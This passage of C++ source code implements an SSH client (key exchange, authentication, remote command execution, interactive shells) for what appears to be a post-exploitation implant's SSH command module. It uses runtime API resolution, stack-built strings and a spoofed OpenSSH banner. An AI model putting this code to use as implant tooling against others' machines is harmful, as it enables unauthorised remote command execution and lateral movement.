    RESOLVE_BC(BCryptSecretAgreement)
    RESOLVE_BC(BCryptDeriveKey)
    RESOLVE_BC(BCryptDestroySecret)
    RESOLVE_BC(BCryptDestroyKey)
    RESOLVE_BC(BCryptSignHash)
    #undef RESOLVE_BC

    // Open RSA algorithm provider for publickey auth
    wchar_t rsa_alg[] = { 'R','S','A', 0 };
    if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(
            &state->h_rsa, rsa_alg, nullptr, 0) != 0) {
        state->h_rsa = nullptr; // non-fatal - publickey auth won't work
    }

    // Open plain SHA-256 provider (no HMAC flag) for SSH key derivation
    wchar_t sha256_alg[] = { 'S','H','A','2','5','6', 0 };
    if (inst.bcrypt_mod.BCryptOpenAlgorithmProvider(
            &state->h_sha256_plain, sha256_alg, nullptr, 0) != 0) {
        inst.heap_free(state);
        return false;
    }

    // WSAStartup
    uint8_t wsa_data[512] = {};
    if (state->pWSAStartup(0x0202, wsa_data) != 0) {
        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(state->h_sha256_plain, 0);
        inst.heap_free(state);
        return false;
    }
    state->wsa_started = true;
    state->initialized = true;
    inst.ssh_state = state;
    return true;
}

auto declfn starburst::ssh_client_destroy(instance& inst) -> void {
    auto st = get_state(inst);
    if (!st) return;

    for (int i = 0; i < SSH_MAX_SESSIONS; i++) {
        if (st->sessions[i].active)
            starburst::ssh_disconnect(inst, i);
    }

    if (st->h_rsa)
        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(st->h_rsa, 0);
    if (st->h_sha256_plain)
        inst.bcrypt_mod.BCryptCloseAlgorithmProvider(st->h_sha256_plain, 0);
    if (st->wsa_started) st->pWSACleanup();
    inst.heap_free(st);
    inst.ssh_state = nullptr;
}

auto declfn starburst::ssh_connect(instance& inst, const char* host, uint16_t port,
    const char* username, const char* password,
    const uint8_t* key_data, uint32_t key_len) -> int32_t
{
    auto st = get_state(inst);
    if (!st || !st->initialized) {
        if (!starburst::ssh_client_init(inst)) {
            st = get_state(inst);
            if (st) ssh_set_error(st, "ssh_client_init failed");
            return -1;
        }
        st = get_state(inst);
    }

    st->last_error[0] = 0;

    // find free session slot
    int32_t idx = -1;
    for (int i = 0; i < SSH_MAX_SESSIONS; i++) {
        if (!st->sessions[i].active) { idx = i; break; }
    }
    if (idx < 0) { ssh_set_error(st, "no free session slot"); return -1; }

    SshSession* sess = &st->sessions[idx];
    memory::zero(sess, sizeof(SshSession));
    sess->id = (uint32_t)idx;

    uint32_t hl = str_len(host);
    uint32_t ul = str_len(username);
    uint32_t pl = str_len(password);
    if (hl >= 256 || ul >= 128 || pl >= 256) { ssh_set_error(st, "host/user/pass too long"); return -1; }
    memory::copy(sess->host, (void*)host, hl);
    memory::copy(sess->username, (void*)username, ul);
    memory::copy(sess->password, (void*)password, pl);
    sess->port = port;
    sess->key_data = nullptr;
    sess->key_len = 0;
    if (key_data && key_len > 0) {
        sess->key_data = static_cast<uint8_t*>(inst.heap_alloc(key_len));
        if (sess->key_data) {
            memory::copy(sess->key_data, (void*)key_data, key_len);
            sess->key_len = key_len;
        }
    }

    // Declare all variables before gotos
    char port_str[8] = {};
    char client_version[] = "SSH-2.0-OpenSSH_9.5";
    uint32_t cv_len = 19;
    char version_line[64] = {};
    char server_version[256] = {};
    uint32_t sv_len = 0;
    uint8_t* client_kexinit = nullptr;
    uint32_t cki_len = 0;

    // TCP connect
    int_to_str(port_str, port, 10);

    {
        ws_addrinfo_ssh hints = {};
        hints.ai_family = WS_AF_INET;
        hints.ai_socktype = WS_SOCK_STREAM;
        hints.ai_protocol = WS_IPPROTO_TCP;

        ws_addrinfo_ssh* result = nullptr;
        if (st->pgetaddrinfo(host, port_str, (const void*)&hints, (void**)&result) != 0) {
            ssh_set_error(st, "getaddrinfo failed (DNS/host resolve)");
            return -1;
        }

        sess->sock = st->psocket(WS_AF_INET, WS_SOCK_STREAM, WS_IPPROTO_TCP);
        if (sess->sock == WS_INVALID_SOCKET) {
            st->pfreeaddrinfo(result);
            ssh_set_error(st, "socket() failed");
            return -1;
        }

        if (st->pconnect(sess->sock, result->ai_addr, (int)result->ai_addrlen) != 0) {
            st->pclosesocket(sess->sock);
            st->pfreeaddrinfo(result);
            ssh_set_error(st, "TCP connect failed (host unreachable or port closed)");
            return -1;
        }
        st->pfreeaddrinfo(result);
    }

    // SSH version exchange
    memory::copy(version_line, client_version, cv_len);
    version_line[cv_len] = '\r';
    version_line[cv_len + 1] = '\n';

    if (!sock_send_all(st, sess, (uint8_t*)version_line, cv_len + 2)) {
        ssh_set_error(st, "failed to send SSH version string");
        goto fail_connect;
    }

    // Read server version
    {
        uint32_t sv_off = 0;
        while (sv_off < 255) {
            uint8_t ch;
            if (!sock_recv_all(st, sess, &ch, 1, 10000)) {
                ssh_set_error(st, "timeout reading server version");
                goto fail_connect;
            }
            if (ch == '\n') break;
            if (ch != '\r') server_version[sv_off++] = ch;
        }
    }
    sv_len = str_len(server_version);

    // Send our KEXINIT
    if (!build_kexinit(inst, &client_kexinit, &cki_len)) {
        ssh_set_error(st, "build_kexinit failed");
        goto fail_connect;
    }

    if (!ssh_send_packet(inst, sess, client_kexinit, cki_len)) {
        inst.heap_free(client_kexinit);
        ssh_set_error(st, "failed to send KEXINIT");
        goto fail_connect;
    }

    // Receive server KEXINIT
    {
        uint8_t* server_kexinit = nullptr;
        uint32_t ski_len = 0;
        if (!ssh_recv_packet(inst, sess, &server_kexinit, &ski_len, "kexinit") || !server_kexinit) {
            inst.heap_free(client_kexinit);
            if (st->last_error[0] == 0)
                ssh_set_error(st, "failed to recv server KEXINIT");
            goto fail_connect;
        }

        if (server_kexinit[0] != SSH_MSG_KEXINIT) {
            inst.heap_free(client_kexinit);
            inst.heap_free(server_kexinit);
            ssh_set_error(st, "server first packet not KEXINIT");
            goto fail_connect;
        }

        // Perform ECDH key exchange
        bool kex_ok = do_kex_ecdh(inst, sess,
            (uint8_t*)client_version, cv_len,
            (uint8_t*)server_version, sv_len,
            client_kexinit, cki_len,
            server_kexinit, ski_len);

        inst.heap_free(client_kexinit);
        inst.heap_free(server_kexinit);

        if (!kex_ok) {
            if (st->last_error[0] == 0)
                ssh_set_error(st, "ECDH key exchange failed");
            goto fail_connect;
        }
    }

    // Authenticate - publickey first if key provided, else password
    if (sess->key_data && sess->key_len > 0) {
        if (!ssh_auth_publickey(inst, sess)) {
            if (st->last_error[0] == 0)
                ssh_set_error(st, "publickey authentication failed");
            goto fail_connect;
        }
    } else {
        if (!ssh_auth_password(inst, sess)) {
            if (st->last_error[0] == 0)
                ssh_set_error(st, "password authentication failed");
            goto fail_connect;
        }
    }

    sess->active = true;
    return idx;

fail_connect:
    st->pclosesocket(sess->sock);
    memory::zero(sess, sizeof(SshSession));
    return -1;
}

auto declfn starburst::ssh_exec(instance& inst, uint32_t session_idx, const char* command,
    char** output, uint32_t* output_len) -> bool
{
    auto st = get_state(inst);
    if (!st || session_idx >= SSH_MAX_SESSIONS) { if (st) ssh_set_error(st, "invalid session index"); return false; }

    SshSession* sess = &st->sessions[session_idx];
    if (!sess->active || !sess->authenticated) { ssh_set_error(st, "session not active or not authenticated"); return false; }

    *output = nullptr;
    *output_len = 0;

    // Open channel, exec, read output, close
    if (!ssh_channel_open(inst, sess)) { ssh_set_error(st, "channel_open failed"); return false; }
    if (!ssh_channel_exec(inst, sess, command)) { ssh_set_error(st, "channel_exec failed"); return false; }

    uint8_t* data = nullptr;
    uint32_t data_len = 0;
    ssh_channel_read_all(inst, sess, &data, &data_len, 60000);

    if (data && data_len > 0) {
        *output = (char*)data;
        *output_len = data_len;
    } else {
        if (data) inst.heap_free(data);
    }

    sess->channel_open = false;
    return true;
}

auto declfn starburst::ssh_disconnect(instance& inst, uint32_t session_idx) -> void {
    auto st = get_state(inst);
    if (!st || session_idx >= SSH_MAX_SESSIONS) return;

    SshSession* sess = &st->sessions[session_idx];
    if (!sess->active) return;

    // Send SSH_MSG_DISCONNECT
    uint8_t disc[13];
    disc[0] = SSH_MSG_DISCONNECT;
    put_u32(disc + 1, SSH_DISCONNECT_HOST_NOT_ALLOWED_TO_CONNECT);
    put_u32(disc + 5, 0); // description (empty string)
    put_u32(disc + 9, 0); // language tag (empty string)
    ssh_send_packet(inst, sess, disc, 13);

    // Cleanup crypto keys (destroy keys before closing algorithm provider)
    if (sess->enc_key) st->pBCryptDestroyKey(sess->enc_key);
    if (sess->dec_key) st->pBCryptDestroyKey(sess->dec_key);
    if (sess->h_aes) inst.bcrypt_mod.BCryptCloseAlgorithmProvider(sess->h_aes, 0);

    if (sess->key_data) {
        memory::zero(sess->key_data, sess->key_len);
        inst.heap_free(sess->key_data);
    }

    st->pclosesocket(sess->sock);
    memory::zero(sess, sizeof(SshSession));
}

auto declfn starburst::ssh_shell_open(instance& inst, uint32_t session_idx) -> bool {
    auto st = get_state(inst);
    if (!st || session_idx >= SSH_MAX_SESSIONS) return false;

    SshSession* sess = &st->sessions[session_idx];
    if (!sess->active || !sess->authenticated) {
        ssh_set_error(st, "session not active/authenticated");
        return false;
    }

    if (!ssh_channel_open(inst, sess)) {
        ssh_set_error(st, "channel_open failed for shell");
        return false;
    }

    // Send pty-req before shell
    const char term[] = "xterm-256color";
    uint32_t term_len = 14;
    const char pty_req[] = "pty-req";
    uint32_t pty_req_len = 7;

    uint32_t pty_pkt_len = 1 + 4 + 4 + pty_req_len + 1 + 4 + term_len + 4 + 4 + 4 + 4 + 4 + 1;
    auto pty_pkt = static_cast<uint8_t*>(inst.heap_alloc(pty_pkt_len));
    if (!pty_pkt) return false;

    uint32_t off = 0;
    pty_pkt[off++] = SSH_MSG_CHANNEL_REQUEST;
    put_u32(pty_pkt + off, sess->remote_channel); off += 4;
    put_u32(pty_pkt + off, pty_req_len); off += 4;
    memory::copy(pty_pkt + off, (void*)pty_req, pty_req_len); off += pty_req_len;
    pty_pkt[off++] = 1; // want reply
    put_u32(pty_pkt + off, term_len); off += 4;
    memory::copy(pty_pkt + off, (void*)term, term_len); off += term_len;
    put_u32(pty_pkt + off, 80); off += 4;  // cols
    put_u32(pty_pkt + off, 24); off += 4;  // rows
    put_u32(pty_pkt + off, 0); off += 4;   // pixel width
    put_u32(pty_pkt + off, 0); off += 4;   // pixel height
    put_u32(pty_pkt + off, 1); off += 4;   // terminal modes string length
    pty_pkt[off++] = 0x00;                 // TTY_OP_END

    if (!ssh_send_packet(inst, sess, pty_pkt, pty_pkt_len)) {
        inst.heap_free(pty_pkt);
        ssh_set_error(st, "failed to send pty-req");
        return false;
    }
    inst.heap_free(pty_pkt);

    // Wait for pty-req response (skip WINDOW_ADJUST, GLOBAL_REQUEST, CHANNEL_DATA)
    {
        bool pty_ok = false;
        for (int i = 0; i < 10; i++) {
            uint8_t* resp = nullptr; uint32_t resp_len = 0;
            if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "pty-req") || !resp) {
                ssh_set_error(st, "no response to pty-req");
                return false;
            }
            uint8_t msg_type = resp[0];
            if (msg_type == SSH_MSG_CHANNEL_SUCCESS) {
                pty_ok = true;
                inst.heap_free(resp);
                break;
            }
            if (msg_type == SSH_MSG_CHANNEL_FAILURE) {
                inst.heap_free(resp);
                ssh_set_error(st, "pty-req denied by server");
                return false;
            }
            if (msg_type == SSH_MSG_CHANNEL_WINDOW_ADJUST && resp_len >= 9) {
                sess->remote_window += get_u32(resp + 5);
            }
            if (msg_type == SSH_MSG_GLOBAL_REQUEST && resp_len > 5) {
                uint32_t name_len = get_u32(resp + 1);
                uint32_t wr_off = 1 + 4 + name_len;
                if (wr_off < resp_len && resp[wr_off]) {
                    uint8_t fail_msg[1] = { SSH_MSG_REQUEST_FAILURE };
                    ssh_send_packet(inst, sess, fail_msg, 1);
                }
            }
            inst.heap_free(resp);
        }
        if (!pty_ok) {
            ssh_set_error(st, "pty-req: no success response after retries");
            return false;
        }
    }

    // Send shell request
    const char shell_str[] = "shell";
    uint32_t shell_str_len = 5;

    uint32_t sh_pkt_len = 1 + 4 + 4 + shell_str_len + 1;
    auto sh_pkt = static_cast<uint8_t*>(inst.heap_alloc(sh_pkt_len));
    if (!sh_pkt) return false;

    off = 0;
    sh_pkt[off++] = SSH_MSG_CHANNEL_REQUEST;
    put_u32(sh_pkt + off, sess->remote_channel); off += 4;
    put_u32(sh_pkt + off, shell_str_len); off += 4;
    memory::copy(sh_pkt + off, (void*)shell_str, shell_str_len); off += shell_str_len;
    sh_pkt[off++] = 1; // want reply

    if (!ssh_send_packet(inst, sess, sh_pkt, sh_pkt_len)) {
        inst.heap_free(sh_pkt);
        ssh_set_error(st, "failed to send shell request");
        return false;
    }
    inst.heap_free(sh_pkt);

    // Wait for shell response (skip WINDOW_ADJUST, GLOBAL_REQUEST, CHANNEL_DATA)
    {
        bool shell_ok = false;
        for (int i = 0; i < 10; i++) {
            uint8_t* resp = nullptr; uint32_t resp_len = 0;
            if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "shell") || !resp) {
                ssh_set_error(st, "no response to shell request");
                return false;
            }
            uint8_t msg_type = resp[0];
            if (msg_type == SSH_MSG_CHANNEL_SUCCESS) {
                shell_ok = true;
                inst.heap_free(resp);
                break;
            }
            if (msg_type == SSH_MSG_CHANNEL_FAILURE) {
                inst.heap_free(resp);
                ssh_set_error(st, "shell request denied by server");
                return false;
            }
            if (msg_type == SSH_MSG_CHANNEL_WINDOW_ADJUST && resp_len >= 9) {
                sess->remote_window += get_u32(resp + 5);
            }
            if (msg_type == SSH_MSG_GLOBAL_REQUEST && resp_len > 5) {
                uint32_t name_len = get_u32(resp + 1);
                uint32_t wr_off = 1 + 4 + name_len;
                if (wr_off < resp_len && resp[wr_off]) {
                    uint8_t fail_msg[1] = { SSH_MSG_REQUEST_FAILURE };
                    ssh_send_packet(inst, sess, fail_msg, 1);
                }
            }
            inst.heap_free(resp);
        }
        if (!shell_ok) {
            ssh_set_error(st, "shell: no success response after retries");
            return false;
        }
    }

    return true;
}

auto declfn starburst::ssh_channel_write(instance& inst, uint32_t session_idx,
    const uint8_t* data, uint32_t data_len) -> bool
{
    auto st = get_state(inst);
    if (!st || session_idx >= SSH_MAX_SESSIONS) return false;

    SshSession* sess = &st->sessions[session_idx];
    if (!sess->active || !sess->channel_open) return false;
    if (sess->channel_eof || sess->channel_closed) return false;

    // Send as SSH_MSG_CHANNEL_DATA
    uint32_t pkt_len = 1 + 4 + 4 + data_len;
    auto pkt = static_cast<uint8_t*>(inst.heap_alloc(pkt_len));
    if (!pkt) return false;

    uint32_t off = 0;
    pkt[off++] = SSH_MSG_CHANNEL_DATA;
    put_u32(pkt + off, sess->remote_channel); off += 4;
    put_u32(pkt + off, data_len); off += 4;
    memory::copy(pkt + off, (void*)data, data_len);

    // Wait for window if needed
    while (sess->remote_window < data_len && !sess->channel_closed) {
        uint8_t* resp = nullptr; uint32_t resp_len = 0;
        if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "win_wait")) break;
        if (resp) {
            if (resp[0] == SSH_MSG_CHANNEL_WINDOW_ADJUST && resp_len >= 9)
                sess->remote_window += get_u32(resp + 5);
            inst.heap_free(resp);
        }
    }

    bool ok = ssh_send_packet(inst, sess, pkt, pkt_len);
    inst.heap_free(pkt);

    if (ok && sess->remote_window >= data_len)
        sess->remote_window -= data_len;

    return ok;
}

auto declfn starburst::ssh_channel_read_nb(instance& inst, uint32_t session_idx,
    uint8_t** out_data, uint32_t* out_len) -> bool
{
    auto st = get_state(inst);
    *out_data = nullptr;
    *out_len = 0;
    if (!st || session_idx >= SSH_MAX_SESSIONS) return false;

    SshSession* sess = &st->sessions[session_idx];
    if (!sess->active || !sess->channel_open) return false;
    if (sess->channel_eof || sess->channel_closed) return false;

    uint32_t buf_cap = 4096;
    auto buf = static_cast<uint8_t*>(inst.heap_alloc(buf_cap));
    if (!buf) return false;
    uint32_t buf_len = 0;

    // Non-blocking: use select with 0 timeout to check for available data
    for (int rounds = 0; rounds < 32; rounds++) {
        ws_fd_set_ssh fds;
        fds.fd_count = 1;
        fds.fd_array[0] = sess->sock;
        ws_timeval_ssh tv = { 0, 0 };

        int sel = st->pselect(0, &fds, nullptr, nullptr, &tv);
        if (sel <= 0) break;

        uint8_t* pkt = nullptr; uint32_t pkt_len = 0;

        // Use a very short timeout recv since select said data is ready
        if (!ssh_recv_packet(inst, sess, &pkt, &pkt_len, nullptr)) break;
        if (!pkt) break;

        uint8_t msg = pkt[0];

        switch (msg) {
        case SSH_MSG_CHANNEL_DATA: {
            if (pkt_len < 9) break;
            uint32_t data_len = get_u32(pkt + 5);
            uint8_t* data = pkt + 9;
            if (data_len > pkt_len - 9) data_len = pkt_len - 9;

            if (buf_len + data_len > buf_cap) {
                uint32_t new_cap = buf_cap * 2;
                while (new_cap < buf_len + data_len) new_cap *= 2;
                auto new_buf = static_cast<uint8_t*>(inst.heap_realloc(buf, new_cap));
                if (!new_buf) { inst.heap_free(pkt); goto done; }
                buf = new_buf;
                buf_cap = new_cap;
            }
            memory::copy(buf + buf_len, data, data_len);
            buf_len += data_len;

            sess->local_window -= data_len;
            if (sess->local_window < SSH_CHANNEL_WINDOW / 2) {
                uint32_t adjust = SSH_CHANNEL_WINDOW - sess->local_window;
                uint8_t wa[9];
                wa[0] = SSH_MSG_CHANNEL_WINDOW_ADJUST;
                put_u32(wa + 1, sess->remote_channel);
                put_u32(wa + 5, adjust);
                ssh_send_packet(inst, sess, wa, 9);
                sess->local_window += adjust;
            }
            break;
        }
        case SSH_MSG_CHANNEL_EXTENDED_DATA: {
            if (pkt_len < 13) break;
            uint32_t data_len = get_u32(pkt + 9);
            uint8_t* data = pkt + 13;
            if (data_len > pkt_len - 13) data_len = pkt_len - 13;

            if (buf_len + data_len > buf_cap) {
                uint32_t new_cap = buf_cap * 2;
                while (new_cap < buf_len + data_len) new_cap *= 2;
                auto new_buf = static_cast<uint8_t*>(inst.heap_realloc(buf, new_cap));
                if (!new_buf) { inst.heap_free(pkt); goto done; }
                buf = new_buf;
                buf_cap = new_cap;
            }
            memory::copy(buf + buf_len, data, data_len);
            buf_len += data_len;
            break;
        }
        case SSH_MSG_CHANNEL_EOF:
            sess->channel_eof = true;
            inst.heap_free(pkt);
            goto done;
        case SSH_MSG_CHANNEL_CLOSE:
            sess->channel_closed = true;
            {
                uint8_t cl[5];
                cl[0] = SSH_MSG_CHANNEL_CLOSE;
                put_u32(cl + 1, sess->remote_channel);
                ssh_send_packet(inst, sess, cl, 5);
            }
            inst.heap_free(pkt);
            goto done;
        case SSH_MSG_CHANNEL_WINDOW_ADJUST:
            if (pkt_len >= 9)
                sess->remote_window += get_u32(pkt + 5);
            break;
        case SSH_MSG_CHANNEL_REQUEST:
            if (pkt_len > 13) {
                uint32_t req_type_len = get_u32(pkt + 5);
                const char exit_status_str[] = "exit-status";
                if (req_type_len == 11 && pkt_len >= 9 + 11 + 1 + 4) {
                    bool match = true;
                    for (int i = 0; i < 11; i++) {
                        if (pkt[9 + i] != exit_status_str[i]) { match = false; break; }
                    }
                    if (match)
                        sess->exit_status = (int32_t)get_u32(pkt + 9 + 11 + 1);
                }
            }
            break;
        default:
            break;
        }
        inst.heap_free(pkt);
    }

done:
    if (buf_len > 0) {
        *out_data = buf;
        *out_len = buf_len;
    } else {
        inst.heap_free(buf);
    }
    return true;
}

auto declfn starburst::ssh_session_alive(instance& inst, uint32_t session_idx) -> bool {
    auto st = get_state(inst);
    if (!st || session_idx >= SSH_MAX_SESSIONS) return false;
    return st->sessions[session_idx].active && st->sessions[session_idx].authenticated;
}

#endif // INCLUDE_CMD_SSH
